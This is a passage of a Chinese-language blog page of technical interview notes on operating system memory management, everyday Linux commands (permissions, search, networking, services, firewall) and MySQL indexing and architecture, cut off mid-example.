href="#34-缺页中断是什么？" class="headerlink" title="34 - 缺页中断是什么？"></a>34 - 缺页中断是什么？</h3><p><strong>产生缺页中断的原因是什么？</strong></p><p><code>malloc()</code>和<code>mmap()</code>等内存分配函数，在分配时只是建立了进程虚拟地址空间，并没有分配虚拟内存对应的物理内存。当进程访问这些没有建立映射关系的虚拟内存时，处理器自动触发一个缺页异常。</p><p><strong>缺页中断：</strong>在请求分页系统中，可以通过查询页表中的状态位来确定所要访问的页面是否存在于内存中。每当所要访问的页面不在内存时，会产生一次缺页中断，此时操作系统会根据页表中的外存地址在外存中找到所缺的一页，将其调入内存。</p><p><strong>缺页本身是一种中断，与一般的中断一样，需要经过4 个处理步骤：</strong></p><ul><li>1、保护CPU 现场</li><li>2、分析中断原因</li><li>3、转入缺页中断处理程序进行处理</li><li>4、恢复CPU 现场，继续执行</li></ul><p><strong>缺页中断是由于所要访问的页面不存在于内存时，由硬件所产生的一种特殊的中断，因此，与一般的中断存在区别：</strong></p><ul><li>1、在指令执行期间产生和处理缺页中断信号</li><li>2、一条指令在执行期间，可能产生多次缺页中断</li><li>3、缺页中断返回时，执行产生中断的一条指令，而一般的中断返回是，执行下一条指令。</li></ul><h3 id="35-常见的内存分配错误有哪些？"><a href="#35-常见的内存分配错误有哪些？" class="headerlink" title="35 - 常见的内存分配错误有哪些？"></a>35 - 常见的内存分配错误有哪些？</h3><p>（1）内存分配失败，却使用了它</p><p>（2）内存虽然分配成功，但没有初始化就引用它</p><p>（3）内存分配成功并且已经初始化，但是操作时越界</p><p>（4）忘记释放内存，造成内存泄露</p><p>（5）释放了内存后又使用它</p><h3 id="36-内存交换中，被换出的进程保存在哪里？"><a href="#36-内存交换中，被换出的进程保存在哪里？" class="headerlink" title="36 - 内存交换中，被换出的进程保存在哪里？"></a>36 - 内存交换中，被换出的进程保存在哪里？</h3><p>保存在磁盘里，也就是外存中。</p><p>具有对换功能的操作系统中，通常把磁盘空间分为文件区和对换区两部分。对换区的IO速度比文件区更快</p><ul><li>文件区主要用于存放文件，追求存储空间的利用率，因此对文件区空间的管理采用离散分配方式；</li><li>对换区空间只占磁盘空间的小部分，被换出的进程数据就存放在对换区。</li></ul><p>由于对换区的速度直接影响到系统的整体速度，因此对换区空间的管理主要追求换入换出的速度，因此通常对换区采用连续分配方式。</p><h3 id="37-抖动是什么现象？"><a href="#37-抖动是什么现象？" class="headerlink" title="37 - 抖动是什么现象？"></a>37 - 抖动是什么现象？</h3><p>刚刚换出的页面又要马上换入内存，刚刚换入的页面马上又要换出外存。这种频繁的页面调度行为称之为抖动，或是颠簸现象。产生抖动的主要原因是进程频繁访问的页面数目高于可用的物理块数（分配给进程的物理块不够）</p><p>为进程分配的物理块太少，会使进程发生抖动现象。为进程分配的物理块太多，又会降低系统整体的并发度，降低某些资源的利用率，为了研究应该为每个进程分配多少个物理块，Denning提出了进程<strong>工作集</strong>的概念。</p><h3 id="38-逻辑地址转物理地址"><a href="#38-逻辑地址转物理地址" class="headerlink" title="38 - 逻辑地址转物理地址"></a>38 - 逻辑地址转物理地址</h3><p><strong>一句话来说：逻辑地址左移四位加偏移地址就是物理地址</strong></p><p>逻辑地址 &#x3D; 段地址：偏移地址</p><p>具体运算：段地址×16（左移四位，也就是2的四次方，相当于乘16）+偏移地址&#x3D;物理地址（可以理解为段地址末尾补一个零）</p><p>逻辑地址是 1000H：0001H</p><p>那么物理地址为1000H×16+0001H&#x3D;10001H</p><p>因为地址本身一般都是十六进制数，所以只需要把段地址左移一位末尾补0再和偏移地址加起来就是物理地址</p><h3 id="39-页表寻址"><a href="#39-页表寻址" class="headerlink" title="39 - 页表寻址"></a>39 - 页表寻址</h3><p><strong>页式内存管理</strong>，内存分成固定长度的一个个页片。</p><p>操作系统为每一个进程维护了一个从虚拟地址到物理地址的映射关系的数据结构，叫页表，页表的内容就是该进程的虚拟地址到物理地址的一个映射。</p><p>页表中的每一项都记录了这个页的基地址。通过页表，由逻辑地址的高位部分先找到逻辑地址对应的页基地址，再由页基地址偏移一定长度就得到最后的物理地址，偏移的长度由逻辑地址的低位部分决定。</p><p>一般情况下，这个过程都可以由硬件完成，所以效率还是比较高的。页式内存管理的优点就是比较灵活，内存管理以较小的页为单位，方便内存换入换出和扩充地址空间。</p><p><strong>Linux 的四级页表机制：</strong></p><p>64位CPU出现后，硬件可以支持4级页表，即PML4</p><ul><li><strong>4 级页表分别是：PGD -&gt; PUD -&gt; PMD -&gt; PTE</strong></li></ul><table><thead><tr><th>字段</th><th>描述</th><th>位数</th></tr></thead><tbody><tr><td>PML4 (Page Map Level 4)</td><td>指向一个PDPT(页目录指针表)</td><td>位47~39</td></tr><tr><td>PGD(Page Global Directory)<br>全局页目录表索引</td><td>指向PDPT中4个项中的一个</td><td>位38~30</td></tr><tr><td>PMD(Page Middle Directory) <br>页中间目录索引</td><td>指向页目录中512项中的一个</td><td>位29~21</td></tr><tr><td>PTE(Page Table Entry) <br>页表入口索引</td><td>指向页表中512项中的一个</td><td>位20~12</td></tr><tr><td>page offset  页内偏移</td><td>4KB页中的偏移</td><td>位11~0</td></tr></tbody></table><h3 id="40-外中断和异常有什么区别？"><a href="#40-外中断和异常有什么区别？" class="headerlink" title="40 - 外中断和异常有什么区别？"></a>40 - 外中断和异常有什么区别？</h3><p>外中断是指CPU执行指令以外的事件引起，如I&#x2F;O完成中断，表示设备输入&#x2F;输出处理已经完成，处理机能够发送下一个输入&#x2F;输出请求。此外还有时钟中断、控制台中断等</p><p>异常是由CPU执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等</p><h3 id="41-什么是用户态和内核态？为什么要有这两种状态？"><a href="#41-什么是用户态和内核态？为什么要有这两种状态？" class="headerlink" title="41 - 什么是用户态和内核态？为什么要有这两种状态？"></a>41 - 什么是用户态和内核态？为什么要有这两种状态？</h3><p>用户态和内核态是操作系统的两种运行状态：</p><ul><li>内核态：处于内核态的CPU可以访问任意的数据，包括外围设备，如网卡、硬盘等，处于内核态的CPU可以从一个程序切换到另一个程序，并且占用CPU不会发生抢占情况，一般处于特权级0的状态称之为内核态。</li><li>用户态：处于用户态的CPU只能受限的访问内存，并且不允许访问外围设备，用户态下的CPU不允许独占，也就是说CPU能够被其他程序获取。</li></ul><p>计算机有一些比较危险的操作，比如设置时钟、内存清理、这些都需要在内核态下完成，如果随意进行操作，系统很容易崩溃</p><h3 id="42-用户态和内核态之间是如何切换的？"><a href="#42-用户态和内核态之间是如何切换的？" class="headerlink" title="42 - 用户态和内核态之间是如何切换的？"></a>42 - 用户态和内核态之间是如何切换的？</h3><p>所有的用户进程都是运行在用户态的，但是用户进程的访问能力有限，一些必要重要的事件，比如从硬盘读取数据，从键盘获取数据的操作则是只有内核态才能做的事情，而这些数据却又对用户程序非常重要，所以就涉及到两种模式的转换。即：</p><p><strong>用户态 –&gt;  内核态 –&gt; 用户态</strong></p><p>而唯一能够操作这些操作的只有系统调用，而能够执行系统调用的只有操作系统，一般 <strong>用户态 –&gt;  内核态</strong> 的转换 称之为 trap进内核，即<strong>陷阱指令</strong></p><p>执行系统调用完成后，将还原用户模式寄存器，然后再以用户态运行。</p><h3 id="43-什么是缓冲区溢出？有什么危害？"><a href="#43-什么是缓冲区溢出？有什么危害？" class="headerlink" title="43 - 什么是缓冲区溢出？有什么危害？"></a>43 - 什么是缓冲区溢出？有什么危害？</h3><p>缓冲区是暂时置放输出或输入数据的内存。</p><p><strong>缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法的数据之上。</strong></p><p>造成缓冲区溢出的主要原因是程序中没有仔细检查用户输入是否合理。</p><p>计算机中，缓冲区造成的危害主要有以下两点：</p><ul><li>程序崩溃导致拒绝服务</li><li>跳转并执行一段恶意代码</li></ul><h3 id="44-原子操作是如何实现的？"><a href="#44-原子操作是如何实现的？" class="headerlink" title="44 - 原子操作是如何实现的？"></a>44 - 原子操作是如何实现的？</h3><p>处理器使用基于对  <strong>缓存加锁</strong>  或  <strong>总线加锁</strong> 的方式来实现 多处理器之间的原子操作</p><h2 id="四、Linux"><a href="#四、Linux" class="headerlink" title="四、Linux"></a>四、Linux</h2><h3 id="你用过的-Linux-常用命令有哪些？（按重要先后顺序排列）"><a href="#你用过的-Linux-常用命令有哪些？（按重要先后顺序排列）" class="headerlink" title="你用过的 Linux 常用命令有哪些？（按重要先后顺序排列）"></a>你用过的 Linux 常用命令有哪些？（按重要先后顺序排列）</h3><h4 id="Part1-常用部分"><a href="#Part1-常用部分" class="headerlink" title="Part1. 常用部分"></a>Part1. 常用部分</h4><h5 id="1-chmod-权限"><a href="#1-chmod-权限" class="headerlink" title="1 - chmod 权限"></a>1 - chmod 权限</h5><p>Linux系统中一切都是文件。Linux使用不同的字符来区分不同的文件：</p><table><thead><tr><th align="center">普通文件</th><th align="center">目录文件</th><th align="center">链接文件</th><th align="center">块设备文件</th><th align="center">字符设备文件</th><th align="center">管道文件</th></tr></thead><tbody><tr><td align="center">-</td><td align="center">d</td><td align="center">l</td><td align="center">b</td><td align="center">c</td><td align="center">p</td></tr></tbody></table><p>其中最常用的是普通文件和目录文件，其操作有：</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210926105417660.png" alt="image-20210926105417660"></p><p>每个文件都有所属的所有者和所有组，并规定了文件的所有者、所有组以及其他人对文件的 <strong>可读（r）、可写（w）、可执行（x）</strong>权限。所以文件的读、写、执行权限可以简写为rwx，也可以用数字4、2、1来表示。文件所有者，所示组及其他用户权限之间无关联</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210926105445692.png" alt="image-20210926105445692"></p><p>文件权限的数字表示法基于字符（rwx）的权限计算而来，其目的是简化权限的表示方式。例如，若某个文件的权限为7，则代表可读、可写、可执行（4+2+1）；若权限为6，则代表可读、可写（4+2）。</p><p>举例说明：现在有这样一个文件，其所有者拥有可读、可写、可执行的权限，其文件所属组拥有可读、可写的权限；其他人只有可读的权限。那么，这个文件的权限就是rwxrw-r–，数字法表示即为764。</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210926105654176.png" alt="image-20210926105654176"></p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210926110048765.png" alt="image-20210926110048765"></p><p>最左边，开头d代表是目录文件，-代表是普通文件，之后是权限，例如 server文件，-rwxr-xr-x 为 普通文件（-）、所有者可读可写可执行（rwx）、所属主可读可执行、其他用户可读可执行。后面的数字是文件个数 ，第一个root是所属主，第二个root是所属组，然后是文件大小，日期</p><p>对server执行 chmod 777 后，权限变成rwxrwxrwx</p><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210926110436330.png" alt="image-20210926110436330"></p><p>如果对一个目录赋权要加 -R，递归执行，如对 freecplus目录执行赋权，即 <code>chmod -R 777 freecplus</code></p><p>还有采取另一种方式，格式为<code> chmod [ugoa…][[±=][rwxX]…] file..</code> ,</p><ul><li>u 表示该档案的拥有者，g 表示与该档案的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</li><li>+表示增加权限、- 表示取消权限、&#x3D; 表示唯一设定权限。</li><li>r 表示可读取，w 表示可写入，x 表示可执行，</li></ul><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210926111502264.png" alt="image-20210926111502264"></p><ul><li>创建一个普通文件szzsleep，权限为rw-r–r–</li><li>用a+x，即所有者、所有组、其他人都添加 x 执行权限，变成 rwxr-xr-x</li><li>再用o-x，将其他用户的 x 执行权限删除</li></ul><h5 id="2-grep-搜索内容"><a href="#2-grep-搜索内容" class="headerlink" title="2 - grep 搜索内容"></a>2 - grep 搜索内容</h5><p>grep (global search regular expression(RE) and print out the line,全面搜索正则表达式并把行打印出来)是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。</p><p>格式： <strong>grep “内容” 文件名</strong> </p><p>内容和文件名均可写作正则表达式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep &#x27;test&#x27; d*　　# 显示所有以d开头的文件中包含 test的行</span><br><span class="line"></span><br><span class="line">grep ‘test&#x27; aa bb cc 　　 # 显示在aa，bb，cc文件中包含test的行</span><br><span class="line"></span><br><span class="line">grep ‘[a-z]\&#123;5\&#125;&#x27; aa 　　# 显示所有包含每行字符串至少有5个连续小写字符的字符串的行</span><br><span class="line"></span><br><span class="line">grep magic /usr/src　　# 显示/usr/src目录下的文件(不含子目录)包含magic的行</span><br><span class="line"></span><br><span class="line">grep -r magic /usr/src　　# 显示/usr/src目录下的文件(包含子目录)包含magic的行</span><br><span class="line"></span><br><span class="line">grep -v test *test*  # 反向查找， 查找文件名中包含test 的文件中但不包含test的行</span><br></pre></td></tr></table></figure><h5 id="3-find-搜索文件"><a href="#3-find-搜索文件" class="headerlink" title="3 - find 搜索文件"></a>3 - find 搜索文件</h5><p>格式：<strong>find 目录名 -name 文件名 -print</strong></p><ul><li>目录名：待搜索的目录，搜索文件的时候，除了这个目录名，还包括它的各级子目录。</li><li>文件名：待搜索的文件名匹配的规则。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -name *.c -print  # 从/tmp目录开始搜索，把全部的*.c文件显示出来</span><br><span class="line"></span><br><span class="line">find . -name *.c -print # 从当前工作目录开始搜索，把全部的*.c文件显示出来</span><br></pre></td></tr></table></figure><h5 id="4-cat、more、tail-显示文本文件内容"><a href="#4-cat、more、tail-显示文本文件内容" class="headerlink" title="4. cat、more、tail 显示文本文件内容"></a>4. cat、more、tail 显示文本文件内容</h5><p><code>cat 文件名</code>：cat命令一次显示整个文件的内容</p><p><code>more 文件名</code>：more命令分页显示文件的内容，按空格键显示下一页，按b键显上一页，按q键退出。</p><p><code>tail -f 文件名</code>：tail -f用于显示文本文件的最后几行，如果文件的内容有增加，就实时的刷新。对程序员来说，tail -f极其重要，可以动态显示后台服务程序的日志，用于调试和跟踪程序的运行。</p><h4 id="Part2-网络（按重要顺序排序）"><a href="#Part2-网络（按重要顺序排序）" class="headerlink" title="Part2. 网络（按重要顺序排序）"></a>Part2. 网络（按重要顺序排序）</h4><table><thead><tr><th align="center">常用命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><strong>ifconfig</strong></td><td align="center"><strong>查看网络接口属性</strong></td></tr><tr><td align="center">ip addr</td><td align="center">查看ip地址</td></tr><tr><td align="center">ipconfig eh0 192.168.1.1 netmask 255.255.255.255</td><td align="center">配置ip地址</td></tr><tr><td align="center"><strong>netstat</strong></td><td align="center"><strong>查看各种网络相关信息</strong></td></tr><tr><td align="center">netstat -lntp</td><td align="center">查看所有监听端口</td></tr><tr><td align="center">netstat -antp</td><td align="center">查看已经建立的TCP连接</td></tr><tr><td align="center">netstat -lutp</td><td align="center">查看TCP&#x2F;UDP的状态信息</td></tr><tr><td align="center">route -n</td><td align="center">查看路由表</td></tr></tbody></table><h4 id="Part3-进程管理与系统命令"><a href="#Part3-进程管理与系统命令" class="headerlink" title="Part3. 进程管理与系统命令"></a>Part3. 进程管理与系统命令</h4><table><thead><tr><th align="center">常用命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">ps -ef</td><td align="center">查看所有进程</td></tr><tr><td align="center">ps -ef |grep expression</td><td align="center">用正则表达式过滤出所需要的进程</td></tr><tr><td align="center">kill -s name</td><td align="center">kill指定名称进程</td></tr><tr><td align="center">kill -s pid</td><td align="center">kill指定pid的进程</td></tr><tr><td align="center">top</td><td align="center">实时显示进程状态</td></tr><tr><td align="center">iostate</td><td align="center">查看io读写&#x2F;cpu使用情况</td></tr><tr><td align="center">sar -u 1 10</td><td align="center">查询cpu使用情况（1秒1次，共10次）</td></tr><tr><td align="center">sar -d 1 10</td><td align="center">查询磁盘性能</td></tr></tbody></table><h4 id="Part4-系统服务"><a href="#Part4-系统服务" class="headerlink" title="Part4. 系统服务"></a>Part4. 系统服务</h4><table><thead><tr><th align="center">常用命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">systemctl  status  &lt;服务名&gt;</td><td align="center">查看某个服务</td></tr><tr><td align="center">systemctl  start &lt;服务名&gt;</td><td align="center">启动某个服务</td></tr><tr><td align="center">systemctl   stop &lt;服务名&gt;</td><td align="center">终止某个服务</td></tr><tr><td align="center">systemctl  restart &lt;服务名&gt;</td><td align="center">重启某个服务</td></tr><tr><td align="center">systemctl  enable &lt;服务名&gt;</td><td align="center">开启自启动</td></tr><tr><td align="center">systemctl  disable &lt;服务名&gt;</td><td align="center">关闭自启动</td></tr><tr><td align="center">chkconfig –list</td><td align="center">列出系统服务</td></tr></tbody></table><p>使用systemctl命令 配置防火墙的过程如下</p><p><strong>查看防火墙的命令：</strong></p><ul><li>1）查看防火墙的版本。firewall-cmd –version</li><li>2）查看firewall的状态。firewall-cmd –state</li><li>3）查看firewall服务状态（普通用户可执行）。systemctl status firewalld</li><li>4）查看防火墙全部的信息。firewall-cmd –list-all</li><li>5）查看防火墙已开通的端口。firewall-cmd –list-port</li><li>6）查看防火墙已开通的服务。firewall-cmd –list-service</li><li>7）查看全部的服务列表（普通用户可执行）。firewall-cmd –get-services</li><li>8）查看防火墙服务是否开机启动。 systemctl is-enabled firewalld</li></ul><p><strong>配置防火墙的命令：</strong></p><ul><li><p>1）启动、重启、关闭防火墙服务。</p><ul><li>systemctl start firewalld # 启动</li><li>systemctl restart firewalld # 重启</li><li>systemctl stop firewalld # 关闭</li></ul></li><li><p>2）开放、移去某个端口。</p><ul><li>firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent # 开放80端口</li><li>firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent # 移去80端口</li></ul></li><li><p>3）开放、移去范围端口。</p><ul><li>firewall-cmd –zone&#x3D;public –add-port&#x3D;5000-5500&#x2F;tcp –permanent # 开放5000-5500之间的端口</li><li>firewall-cmd –zone&#x3D;public –remove-port&#x3D;5000-5500&#x2F;tcp –permanent # 移去5000-5500之间的端口</li></ul></li><li><p>4）开放、移去服务。</p><ul><li>firewall-cmd –zone&#x3D;public –add-service&#x3D;ftp –permanent # 开放ftp服务</li><li>firewall-cmd –zone&#x3D;public –remove-service&#x3D;ftp –permanent # 移去http服务</li></ul></li><li><p>5）重新加载防火墙配置（修改配置后要重新加载防火墙配置或重启防火墙服务）。</p><ul><li>firewall-cmd –reload</li></ul></li><li><p>6）设置开机时启用、禁用防火墙服务。</p><ul><li>systemctl enable firewalld # 启用服务</li><li>systemctl disable firewalld # 禁用服务</li></ul></li></ul><h3 id="你用过的-Linux-常用命令有哪些？（按重要先后顺序排列）-1"><a href="#你用过的-Linux-常用命令有哪些？（按重要先后顺序排列）-1" class="headerlink" title="你用过的 Linux 常用命令有哪些？（按重要先后顺序排列）"></a>你用过的 Linux 常用命令有哪些？（按重要先后顺序排列）</h3><ul><li>首先是一些文件和目录操作的命令，比如：<ul><li>cd 、pwd、 ls、</li><li>创建 touch 、mkdir，删除 rm、移动或重命名 rm，复制cp</li><li>cat、more、tail 查看文件内容</li><li>还有一些重要的命令，如chmod 权限管理、grep 搜索内容、find 搜索文件</li></ul></li><li>还有一些和网络相关的命令<ul><li>ipconfig 查看网络接口属性，配置ip地址</li><li>netstat 查看各种网络相关信息</li><li>route 查看路由</li><li>ping</li></ul></li><li>进程管理的常用命令有：<ul><li>ps -ef 查看所有进程信息</li><li>kill 杀死进程</li></ul></li><li>系统方面常用的有：<ul><li>top 可以动态显示cpu、内存、进程等情况</li><li>iostat 可以查看io读写&#x2F;cpu使用情况</li><li>sar 查询cpu、磁盘使用情况</li><li>env 可以查看环境变量</li><li>date 显示日期</li></ul></li><li>还有一些服务的常用命令<ul><li>systemctl 管理服务</li><li>firewall-cmd 防火墙</li><li>vsftpd 文件传输</li></ul></li><li>一些软件安装管理的<ul><li>rpm、yum、dpkg、apt-get用于安装管理软件</li><li>解压缩有：<ul><li>tar -xvf xxx.tar 解压tar包</li><li>zip、unzip</li><li>gzip与gunzip</li></ul></li></ul></li></ul><h2 id="五、数据库"><a href="#五、数据库" class="headerlink" title="五、数据库"></a>五、数据库</h2><h3 id="1-说一说对MySQL架构的了解？"><a href="#1-说一说对MySQL架构的了解？" class="headerlink" title="1- 说一说对MySQL架构的了解？"></a>1- 说一说对MySQL架构的了解？</h3><p>MySQL可以分为 Server层 和 存储引擎两部分。</p><p>Server层：包括连接器、查询缓存、分析器、优化器、执行器等，涵盖MySQL的大多数核心服务功能，以及所有的内置函数（如日期、时间、数字、加密函数等），所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图等。</p><p>存储引擎：负责数据的存储和提取，其架构是插件式的，支持InnoDB、MyISAM等多个存储引擎。MySQL5.5.5版本后默认存储引擎是InnoDB</p><h3 id="2-数据库三大范式是什么？"><a href="#2-数据库三大范式是什么？" class="headerlink" title="2 - 数据库三大范式是什么？"></a>2 - 数据库三大范式是什么？</h3><ul><li>第一范式——<strong>无重复的列（原子性）：</strong>强调的是列的原子性，数据表的每一列都是不可分割的原子数据项</li><li>第二范式——<strong>要求实体的属性完全依赖于主关键字（唯一性）：</strong>所谓完全依赖是指不能存在依赖主关键字一部分的属性<ul><li>第二范式（2NF）要求数据库表中的每个实例或行必须可以被惟一地区分。为实现区分通常需要为表加上一个列，以存储各个实例的惟一标识。这个惟一属性列被称为主关键字或主键、主码。</li></ul></li><li>第三范式——<strong>任何主属性不依赖于其他非主属性（每列都与主键有直接关系，不存在传递依赖）</strong><ul><li>第三范式（3NF）要求一个数据库表中不包含已在其它表中已包含的非主关键字信息。</li></ul></li></ul><h3 id="3-一条SQL语句在数据库框架中的执行流程？"><a href="#3-一条SQL语句在数据库框架中的执行流程？" class="headerlink" title="3 - 一条SQL语句在数据库框架中的执行流程？"></a>3 - 一条SQL语句在数据库框架中的执行流程？</h3><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20211011204851519.png"></p><ol><li>应用程序把查询SQL语句发送给服务器执行；</li><li>查询缓存，如果缓存是打开的，服务器在收到查询请求后，并不会直接去数据库查询，而是在数据库的查询缓存中找是否有相同的查询数据，如果存在，直接返回给客户端。只有缓存不存在时，才会进行下面的操作</li><li>查询优化处理，生成执行计划。包括解析SQL、预处理、优化SQL、执行计划   </li><li>MySQL根据相应的执行计划完成整个查询</li><li>将查询结果返回给客户端</li></ol><h3 id="4-谈谈你对MVCC的了解？"><a href="#4-谈谈你对MVCC的了解？" class="headerlink" title="4 - 谈谈你对MVCC的了解？"></a>4 - 谈谈你对MVCC的了解？</h3><p><strong>MVCC（Multi-Version Concurrency Control, 多版本并发控制）</strong>，数据库并发场景：</p><ul><li>读——读：不存在任何问题，也不需要并发控制</li><li>读——写：有线程安全问题，可能会造成事务隔离性问题，可能遇到脏读，幻读，不可重复读</li><li>写——写：有线程安全问题，可能会存在更新丢失的问题</li></ul><p>MVCC 可以为数据库解决以下问题：</p><ul><li>在并发读写数据库时，可以做到在读操作时不用阻塞写操作，写操作也不用阻塞读操作，提高了数据库并发的读写性能</li><li>可以解决脏读、不可重复读、幻读等事务隔离问题，但不能解决更新丢失问题。</li></ul><h3 id="5-查询性能的优化方法？"><a href="#5-查询性能的优化方法？" class="headerlink" title="5 - 查询性能的优化方法？"></a>5 - 查询性能的优化方法？</h3><ul><li>减少请求的数据量<ul><li>只返回必要的列：最好不要使用 SELECT * 语句</li><li>只返回必要的行：使用 LIMIT 语句来限制返回的数据</li><li>缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能是非常明显的</li></ul></li><li>减少服务端扫描的行数：<ul><li>使用索引来覆盖查询</li></ul></li></ul><h3 id="6-谈谈你对索引的理解？"><a href="#6-谈谈你对索引的理解？" class="headerlink" title="6 - 谈谈你对索引的理解？"></a>6 - 谈谈你对索引的理解？</h3><p>索引的出现是为了提高数据的查询效率，就像书的目录一样。</p><h4 id="索引也会带来负面影响："><a href="#索引也会带来负面影响：" class="headerlink" title="索引也会带来负面影响："></a>索引也会带来负面影响：</h4><ul><li>创建索引和维护索引需要消耗时间，这个时间随着数据量的增加而增加</li><li>索引需要占用物理内存，不光是表需要占用数据空间，每个索引也需要占用物理空间</li><li>当对表进行增删改查的时候，索引也要动态维护，降低了数据的维护速度</li></ul><h4 id="建立索引的原则："><a href="#建立索引的原则：" class="headerlink" title="建立索引的原则："></a>建立索引的原则：</h4><ul><li>在最频繁使用的、用以缩小查找返回的字段建立索引</li><li>在频繁使用的、需要排序的字段上建立索引</li></ul><h4 id="不适合建索引的情况："><a href="#不适合建索引的情况：" class="headerlink" title="不适合建索引的情况："></a>不适合建索引的情况：</h4><ul><li>对于查询中很少涉及的列或重复值比较多的列，不适合建立索引</li><li>对于一些特殊的数据类型，不适合建立索引，比如文本字段 (text)等</li></ul><h3 id="7-索引的分类？"><a href="#7-索引的分类？" class="headerlink" title="7 - 索引的分类？"></a>7 - 索引的分类？</h3><ul><li>数据结构角度<ul><li>树索引 $O(\log{n})$</li><li>Hash索引</li></ul></li><li>物理存储角度：<ul><li>聚簇索引</li><li>非聚簇索引</li></ul></li><li>逻辑角度<ul><li>普通索引</li><li>唯一索引</li><li>主键索引</li><li>联合索引</li><li>全文索引</li></ul></li></ul><h3 id="8-谈谈你对哈希索引的理解？"><a href="#8-谈谈你对哈希索引的理解？" class="headerlink" title="8 - 谈谈你对哈希索引的理解？"></a>8 - 谈谈你对哈希索引的理解？</h3><p>哈希索引能以 $O(1)$ 时间进行查找，但失去了有序性。无法用于排序与分组，只支持精确查找，无法用于部分查找和范围查找</p><p>InnoDB存储引擎有一个特殊功能叫 “自适应哈希索引” ，当某个索引值被使用的非常频繁时，会在B+树索引之上再创建一个哈希索引，这样就让B+Tree索引具有哈希索引的一些优点，实现快速的哈希查找</p><h3 id="9-谈谈你对聚簇索引的理解？"><a href="#9-谈谈你对聚簇索引的理解？" class="headerlink" title="9 - 谈谈你对聚簇索引的理解？"></a>9 - 谈谈你对聚簇索引的理解？</h3><ul><li><p>聚簇索引是对磁盘上实际数据重新组织，然后按指定的一个或多个列的值排序的算法。</p></li><li><p>聚簇索引的特点是存储数据的顺序和索引顺序一致。</p></li><li><p>一般情况下主键会默认创建聚簇索引，而且一张表只允许存在一个聚簇索引</p></li></ul><h3 id="10-谈谈你对覆盖索引的认识？"><a href="#10-谈谈你对覆盖索引的认识？" class="headerlink" title="10 - 谈谈你对覆盖索引的认识？"></a>10 - 谈谈你对覆盖索引的认识？</h3><p>覆盖索引是select的数据列只用从索引中就能够取得，不必读取数据行，换句话说查询列要被所建的索引覆盖。覆盖索引优点有：</p><ul><li><ol><li>索引通常远小于数据行的大小，只读取索引能大大减少数据访问量</li></ol></li><li><ol start="2"><li>一些存储引擎（例如：MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存，因此，只访问索引可以不使用系统调用，系统调用通常比较费时</li></ol></li><li><ol start="3"><li>对于InnoDB引擎，若辅助索引能够覆盖查询，则无需访问主索引</li></ol></li></ul><h3 id="11-怎么知道创建的索引有没有被使用到？或者说怎么才可以知道这条语句运行很慢的原因？"><a href="#11-怎么知道创建的索引有没有被使用到？或者说怎么才可以知道这条语句运行很慢的原因？" class="headerlink" title="11 - 怎么知道创建的索引有没有被使用到？或者说怎么才可以知道这条语句运行很慢的原因？"></a>11 - 怎么知道创建的索引有没有被使用到？或者说怎么才可以知道这条语句运行很慢的原因？</h3><p>使用Explain命令查看语句的执行计划，MySQL在执行某个语句之前，会将该语句过一遍查询优化器，之后会拿到对语句的分析，也就是执行计划，其中包含了很多信息。可以通过其中和索引有关的信息来分析是否命中了索引，例如：possible_key、key、key_len等字段，分别说明了此语句可能会使用的索引、实际使用的索引以及索引的长度</p><h3 id="12-什么情况下索引会失效？即查询不走索引？"><a href="#12-什么情况下索引会失效？即查询不走索引？" class="headerlink" title="12 - 什么情况下索引会失效？即查询不走索引？"></a>12 - 什么情况下索引会失效？即查询不走索引？</h3><p>1、索引列参与表达式计算</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;sname&#x27;</span> <span class="keyword">FROM</span> <span class="string">&#x27;stu&#x27;</span> <span class="keyword">WHERE</span> <span class="string">&#x27;age&#x27;</span> <span class="operator">+</span> <span class="number">10</span> <span class="operator">=</span> <span class="number">30</span>;</span><br></pre></td></tr></table></figure><p>2、函数运算：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;sname&#x27;</span> <span class="keyword">FROM</span> <span class="string">&#x27;stu&#x27;</span> <span class="keyword">WHERE</span> <span class="keyword">LEFT</span>(<span class="string">&#x27;date&#x27;</span>,<span class="number">4</span>) <span class="operator">&lt;</span> <span class="number">1900</span>;</span><br></pre></td></tr></table></figure><p>3、%语句% 模糊查询:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="string">&#x27;manong&#x27;</span> <span class="keyword">WHERE</span> <span class="string">&#x27;uname&#x27;</span> <span 